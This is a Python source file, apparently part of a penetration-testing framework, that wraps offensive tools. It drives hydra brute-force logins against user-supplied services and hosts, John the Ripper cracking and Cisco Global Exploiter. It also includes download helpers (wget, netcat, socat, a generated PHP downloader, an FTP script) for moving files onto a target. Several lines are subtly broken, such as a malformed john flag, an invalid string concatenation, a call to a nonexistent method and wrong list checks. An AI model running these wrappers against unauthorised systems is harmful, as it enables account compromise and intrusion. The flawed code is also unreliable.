
from Session import *
from Tool import Tool as Base
from Tool import ToolCategory

class CustomWordlist(Base):
    def __init__(self):
        self._desc = 'This tool will utilize a few methods for creating a custom wordlist.\n' + \
            'html2dic from downloaded HTML.\n' + \
            'cewl to removed duplicates.\n' + \
            'john to create rules from the compiled list.'
        self._name = 'CustomWorklist'
        self._example = 'CustomWorklist'
        self._category = ToolCategory.Password
        self._cmd = 'CustomWorklist'
        self._args = ''

    def __repr__(self):
        return super().__repr__()

    def __str__(self):
        return super().__str__()

    def run(self, **args):
        import os
        import glob
        import Utility

        print('Enter output filename > ' , end = '')
        fileName = input()

        print('This is going to create a custom wordlist based on HTML pages downloaded, continue(Y/N)? > ' , end = '')
        choice = input()
        if choice.lower() != 'y':
            print('> ' , end = '')
            return
        print('Enter output directory (typically [session]/intel/httrack > ', end = '')
        choice = input()
        arry = Utility.getAllFiles(choice)
        for file in arry:
            self.convertToDict(file, fileName)

        # Use John to mangle
        session.runCmdSimple('john ---wordlist=' + fileName + ' --rules --stdout > ' + fileName, 'Running John to create mangled wordlist', fileName)

        # Remove duplicates
        print('Removing duplicates')
        session.runsimple('awk \'!seen[$0]++\' ' + session.getWorkingDir() + +'/' + fileName, 'Removing duplicates', fileName)
        print('File created in the session\'s working directory')

    def convertToDict(self, file, outputFile):
        session.runCmdSimple('html2dic ' + file + ' >>' + session.getWorkingDir() +  '/' + outputFile)

        return

class BruteSopSingleServer(Base):
    def __init__(self):
        self._desc = 'This is the SOP for bruting.  Iterate over users instead of passwords, and a single servers.'
        self._name = 'BruteSopSingleServer'
        self._example = 'BruteSopSingleServer, will need a user list, password list.'
        self._category = ToolCategory.Password
        self._cmd = 'BruteSopSingleServer'
        self._args = ''       

    def __repr__(self):
        return super().__repr__()

    def __str__(self):
        return super().__str__()

    def run(self, **args):
        # hydra -s 22 -L users.txt -u -P /usr/share/wordlists/rockyou.txt -t 16 -e nsr -o ${working_dir}/loot/hydra.out ssh SERVICE://TARGET

        cmd = 'hydra -t 2 -e nsr -o ' + session.getWorkingDir() + '/loot/hydra.out'

        print('perform an SSL connect (y/N)? > ', end = '')
        choice = input()
        if choice.lower() == 'y':
            cmd = cmd + ' -S '

        print('Enter the PORT > ' , end = '')
        port = input()
        if port != '':
            cmd = cmd + ' -s ' + port

        print('Enter the USER LIST > ' , end = '')
        userList = input()
        if userList == '':
            return
        else:
            cmd = cmd + ' -L ' + userList + ' -u '

        print('Enter the PASSWORD LIST (rockyou) > ' , end = '')
        passList = input()
        if userList == '':
            passList = '/usr/share/wordlists/rockyou.txt'
        else:
            cmd = cmd + ' -P ' + passList

        print('afp\t\tcisco\t\tcisco-enable\t\tcvs\r\n' + \
              'firebird\tftp\t\thttp-get\t\thttp-head\r\n' + \
              'http-proxy\thttps-get\thttps-head\t\thttps-form-get\r\n' + \
              'https-form-post\ticq\t\timap\t\t\timap-ntlm\r\n' + \
              'ldap2\t\tldap3\t\tmssql\t\t\tmysql\r\n' + \
              'ncp\t\tnntp\t\toracle-listener\t\tpcanywhere\r\n' + \
              'pcnfs\t\tpop3\t\tpop3-ntlm\t\tpostgres\r\n' + \
              'rexec\t\trlogin\t\trsh\t\t\tsapr3\r\n' + \
              'sip\t\tsmb\t\tsmbnt\t\t\tsmtp-auth\r\n' + \
              'smtp-auth-ntlm\tsnmp\t\tsocks5\t\t\tssh2\r\n' + \
              'teamspeak\ttelnet\t\tvmauthd\t\t\tvnc')
        print('Enter the SERVICE > ' , end = '')
        service = input()
        if service == '':
            return
        else:
            cmd = cmd + ' ' + service + '://' + session.getRemoteHost()

        outFile = self.compileOutfile()
        session.runThreadedCmd(cmd + outFile, 'BruteSopSingleServer')

        return

class BruteSopMultiServer(Base):
    def __init__(self):
        self._desc = 'This is the SOP for bruting.  Iterate over users instead of passwords, and multiple servers.'
        self._name = 'BruteSopMultiServer'
        self._example = 'BruteSopMultiServer, will need a server list, password list, and user list.'
        self._category = ToolCategory.Password
        self._cmd = 'BruteSopMultiServer'
        self._args = ''       

    def run(self, **args):
        # hydra -s 22 -L users.txt -u -P /usr/share/wordlists/rockyou.txt -M servers.txt -t 16 -e nsr -o ${working_dir}/loot/hydra.out ssh #PORT
        cmd = 'hydra -t 2 -e nsr -o ' + session.getWorkingDir() + '/loot/hydra.out'

        print('Enter the SERVER LIST file > ' , end = '')
        serverList = input()
        if serverList == '':
            return
        else:
            cmd = cmd + ' -M ' + serverList

        print('perform an SSL connect (y/N)? > ', end = '')
        choice = input()
        if choice.lower() == 'y':
            cmd = cmd + ' -S '

        print('Enter the PORT > ' , end = '')
        port = input()
        if port != '':
            cmd = cmd + ' -s ' + port

        print('Enter the USER LIST > ' , end = '')
        userList = input()
        if userList == '':
            return
        else:
            cmd = cmd + ' -L ' + userList + ' -u '

        print('Enter the PASSWORD LIST (rockyou) > ' , end = '')
        passList = input()
        if userList == '':
            passList = '/usr/share/wordlists/rockyou.txt'
        else:
            cmd = cmd + ' -P ' + passList

        print('afp\t\tcisco\t\tcisco-enable\t\tcvs\r\n' + \
              'firebird\tftp\t\thttp-get\t\thttp-head\r\n' + \
              'http-proxy\thttps-get\thttps-head\t\thttps-form-get\r\n' + \
              'https-form-post\ticq\t\timap\t\t\timap-ntlm\r\n' + \
              'ldap2\t\tldap3\t\tmssql\t\t\tmysql\r\n' + \
              'ncp\t\tnntp\t\toracle-listener\t\tpcanywhere\r\n' + \
              'pcnfs\t\tpop3\t\tpop3-ntlm\t\tpostgres\r\n' + \
              'rexec\t\trlogin\t\trsh\t\t\tsapr3\r\n' + \
              'sip\t\tsmb\t\tsmbnt\t\t\tsmtp-auth\r\n' + \
              'smtp-auth-ntlm\tsnmp\t\tsocks5\t\t\tssh2\r\n' + \
              'teamspeak\ttelnet\t\tvmauthd\t\t\tvnc')
        print('Enter the SERVICE > ' , end = '')
        service = input()
        if service == '':
            return
        else:
            cmd = cmd + ' ' + service

        outFile = self.compileOutfile()
        session.runThreadedCmd(cmd + outFile, 'BruteSopMultiServer')

        return

class CiscoGlobalExploiter(Base):
    def __init__(self):
        self._desc = 'Cisco Global Exploiter (CGE), is an advanced, simple and fast security testing tool.'
        self._name = 'CiscoGlobalExploiter'
        self._example = 'CiscoGlobalExploiter TARGET'
        self._category = ToolCategory.VulnerabilityScanner
        self._cmd = 'CiscoGlobalExploiter'
        self._args = ''

    def __repr__(self):
        return super().__repr__()

    def __str__(self):
        return super().__str__()

    def run(self, **args):
        for i in range(1, 15):
            outFile = ' >> ' + session.getIntelDir() + '/CiscoGlobalExploiter.out'
            #print('cge.pl 192.168.99.230 ' + str(i) + outFile)
            session.runCmdSimple('cge.pl ' + session.getRemoteHost() + str(i) + outFile, self._desc, outFile)

        return

class OpenVAS(Base):
    def __init__(self):
        self._desc = 'OpenVAS an semi-interactive security scanner with a browser UI.\r\n\r\nhttps://www.kali.org/tutorials/configuring-and-tuning-openvas-in-kali-linux'
        self._name = 'OpenVAS'
        self._example = 'OpenVAS'
        self._category = ToolCategory.VulnerabilityScanner
        self._cmd = 'OpenVAS'
        self._args = ''

    def __repr__(self):
        return super().__repr__()

    def __str__(self):
        return super().__str__()

    def run(self, **args):
        print('Enter new user password > ' , end = '')
        userPass = input()

        print('Enter admin password > ' , end = '')
        adminPass = input()

        session.runCmdSimple('openvas-setup')
        session.runCmdSimple('openvasmd --rebuild')
        session.runCmdSimple('openvas-check-setup')
        session.runCmdSimple('openvasmd --create-user=dookie')
        session.runCmdSimple('openvasmd --user=dookie --new-password=' + userPass)
        session.runCmdSimple('openvasmd --user=admin --new-password=' + adminPass)
        
        print('Check for an open socket to connect to, typically 9390 and 9392')
        session.runCmdSimple('ss -ant', 'Check for an open socket to connect to, typically 9390 and 9392')
        session.runCmdSimple('firefox -new-window https://localhost:9392', 'Starting OpenVAS')

        return

class JohnTheRipperAdvanced(Base):
    def __init__(self):
        self._desc = 'Hard-coded some more advanced options for John.  \r\nThis might need to be ran on a remote machine because it could take awhile.'
        self._name = 'JohnTheRipperAdvanced'
        self._example = 'JohnTheRipperAdvanced'
        self._category = ToolCategory.Password
        self._cmd = 'JohnTheRipperAdvanced'
        self._args = ''

    def __repr__(self):
        return super().__repr__()

    def __str__(self):
        return super().__str__()

    def run(self, **args):
        print('Enter encrypted file > ' , end = '')
        encrptedFile = input()

        print('Enter password wordlist > ' , end = '')
        passWordlist = input()

        print('Select Mode:')
        print('1 = Wordlist only, but permitting the use of word mangling rules')
        print('2 = Restore a previous session.')
        print('3 = Incremental mode.')
        print('4 = Generate a new charset file')

        cmd = ''
        choice = input()
        if choice == '1':
            cmd = 'john --wordlist=' + passWordlist + ' --rules ' + encrptedFile
        elif choice == '2':
            cmd = 'john --restore'
        elif choice == '3':
            cmd = 'john --incremental ' + encrptedFile
        elif choice == '4':
            print('Enter character file > ', end = '')
            fileName = input()
            print('Enter output file > ', end = '')
            outFile = input()
            cmd = 'john --make-charset=' + fileName + ' ' + outFile

        if len(cmd) > 0:
            session.runThreadedCmd(cmd, 'John The Ripper', self.onComplete)

        return

    def onComplete(self):
        session.runCmdSimple('john --show passwd') 
        print('')
        session.runCmdSimple('john --show --groups=0,1 mypasswd')
        print('')
        session.runCmdSimple('john --show --users=0 mypasswd')
        return

class DownloadFileLinux(Base):
    def __init__(self):
        self._desc = 'Multiple stragies to downloading a file.\r\n\r\nhttps://xapax.gitbooks.io/security/content/transfering_files_to_windows.html'
        self._name = 'DownloadFile'
        self._example = 'DownloadFile'
        self._category = ToolCategory.Maintaining
        self._cmd = 'DownloadFile'
        self._args = ''

    def __repr__(self):
        return super().__repr__()

    def __str__(self):
        return super().__str__()

    def run(self, **args):
        print('Select Option:')
        print('1 = From URL (WGET)')
        print('2 = Netcat')
        print('3 = Socat')
        print('4 = PHP')
        print('5 = SCP')

        choice = input()
        cmd = ''
        if choice == '1':
            print('Enter URL > ', end = '')
            url = input()
            cmd = 'wget ' + url
        elif choice == '2':
            print('Run this manually:')
            print('Host machine: nc -lvp 4444 < file')
            print('Enter Host IP > ', end = '')
            ip = input()
            print('Enter Host port > ', end = '')
            port = input()
            print('Enter file name > ', end = '')
            fileName = input()
            cmd = 'nc ' + ip + ' ' + port + ' > ' + fileName
        elif choice == '3':
            print('Host machine: socat -u TCP-LISTEN:9876,reuseaddr OPEN:out.txt,creat && cat out.txt')
            print('Enter Host IP > ', end = '')
            ip = input()
            print('Enter Host port > ', end = '')
            port = input()
            print('Enter file name > ', end = '')
            fileName = input()
            cmd = 'socat -u FILE:' + fileName + ' TCP:' + ip + ':' + port
        elif choice == '4':
            print('Enter URL > ', end = '')
            url = input()
            print('Enter file name > ', end = '')
            fileName = input()
            cmd = 'echo "<?php file_put_contents(\'' + fileName + '\', fopen(\'' + url + '\', \'r\')); ?>" > download.php'
        elif choice == '5':
            print('Enter username > ', end = '')
            username = input()
            print('Enter server > ', end = '')
            server = input()
            print('Enter source file > ', end = '')
            source = input()
            print('Enter destination file > ', end = '')
            dest = input()
            cmd = 'scp ' + source + ' ' + username + '@' + server + ':' + dest

        if len(cmd) > 0:
            session.runCmdSimple(cmd, 'Downloading file')

        return

class DownloadFileWindows(Base):
    def __init__(self):
        self._desc = 'Multiple stragies to downloading a file.\r\n\r\nhttps://xapax.gitbooks.io/security/content/transfering_files_to_windows.html'
        self._name = 'DownloadFile'
        self._example = 'DownloadFile'
        self._category = ToolCategory.Maintaining
        self._cmd = 'DownloadFile'
        self._args = ''

    def __repr__(self):
        return super().__repr__()

    def __str__(self):
        return super().__str__()

    def run(self, **args):
        print('Select Option:')
        print('1 = TFP')
        print('2 = TFTP')
        print('3 = VBScript')
        print('4 = PowerShell')
        print('5 = Debug.exe')

        choice = input()
        cmd = ''
        if choice == '1':
            print('Enter Host IP > ', end = '')
            ip = input()
            print('Enter Host port > ', end = '')
            port = input()
            print('Enter file name > ', end = '')
            fileName = input()
            print('Enter user name > ', end = '')
            username = input()
            print('Enter password > ', end = '')
            password = input()

            session.runCmdSimple('echo open ' + ip + ' ' + port + ' > ftp.txt')
            session.runCmdSimple('echo USER ' + username + ' >> ftp.txt')
            session.runCmdSimple('echo ' + password + ' >> ftp.txt')
            session.runCmdSimple('echo bin >> ftp.txt')
            session.runCmdSimple('echo GET ' + fileName + ' >> ftp.txt')
            session.runCmdSimple('echo bye >> ftp.txt')
            session.runCmdSimple('ftp -v -n -s:ftp.txt')
            return
        elif choice == '2':
            pass
        elif choice == '3':
            pass
        elif choice == '4':
            pass
        elif choice == '5':
            pass

        if len(cmd) > 0:
            session.runCmdSimple(cmd, 'Downloading file')

        return
        
class SearchsploitNmap(Base):
    def __init__(self):
        self._desc = 'Runs \'searchsploit\' based on the Nmap files in the \'intel\' directory, and parse the results.'
        self._name = 'searchsploit_nmap'
        self._example = 'searchsploit -j --nmap intel/NMAP_FILE | tee outFile'
        self._category = ToolCategory.Exploit
        self._cmd = 'searchsploit_nmap'
        self._args = ''

    def __repr__(self):
        return super().__repr__()

    def __str__(self):
        return super().__str__()

    def run(self, **args):
        import os
        import glob
        import Parsers
        import Session

        parser = Parsers.ParserSearchSploitNmap()
        dir = Session.session.getIntelDir()
        exploitDir = Session.session.getExploitDir()
        for filename in glob.glob(dir + '/nmap_*'):
            filename = os.path.basename(filename)
            print('\033[94m' + 'Parsing: ' + filename + '\033[0m')
            outFile = exploitDir + '/searchsploit_' + filename + '.json'
            cmd = 'searchsploit -j --nmap ' + dir + '/' + filename + ' | tee ' + outFile
            Session.session.runCmdSimple(cmd, 'Using searchsploit for any known vulnerabilities')
            parser.parseFile(outFile)

        return
        
class SearchsploitTargetHost(Base):
    def __init__(self):
        self._desc = 'Runs \'searchsploit\' based on the information gathered and stored in the \'Target Host\' object.'
        self._name = 'searchsploit_targethost'
        self._example = 'searchsploit term | tee outFile'
        self._category = ToolCategory.Exploit
        self._cmd = 'searchsploit_targethost'
        self._args = ''

    def __repr__(self):
        return super().__repr__()

    def __str__(self):
        return super().__str__()

    def run(self, **args):
        import os
        import glob
        import Parsers
        import Session

        parser = Parsers.ParserSearchSploit()
        dir = Session.session.getIntelDir()
        exploitDir = Session.session.getExploitDir()
        filename = 'searchsploit_targethost'
        outFile = exploitDir + '/searchsploit_targethost.json'
        
        for service in Session.session.targetHost.getServices():
            serviceName = service.getName()
            if 'samba' in serviceName and 'netbios-ssn' in serviceName:
                serviceName = 'samba'
            
            search = serviceName.replace(',', '') + ' '
            cmd = 'searchsploit -j ' + search + ' | tee ' + outFile
            Session.session.runCmdSimple(cmd, 'Using searchsploit for any known vulnerabilities')
            parser.parseFile(outFile)

        return
        
class SearchsploitCustomSearch(Base):
    def __init__(self):
        self._desc = 'Runs \'searchsploit\' based on the search term/s from input.'
        self._name = 'searchsploit_customsearch'
        self._example = 'searchsploit term | tee outFile'
        self._category = ToolCategory.Exploit
        self._cmd = 'searchsploit_customsearch'
        self._args = ''

    def __repr__(self):
        return super().__repr__()

    def __str__(self):
        return super().__str__()

    def run(self, **args):
        import Session

        exploitDir = Session.session.getExploitDir()
        outFile = exploitDir + '/searchsploit_customsearch.json'
        
        print('Enter your search terms: ')
        term = input()
        cmd = 'searchsploit -j ' + term + ' | tee ' + outFile
        Session.session.runCmd(cmd, 'seachsploit', None, self.onComplete, outFile, True)
        return
        
    def onComplete(self, outFile):
        import Parsers
        parser = Parsers.ParserSearchSploit()
        parser.parseFile(outFile)
        return
        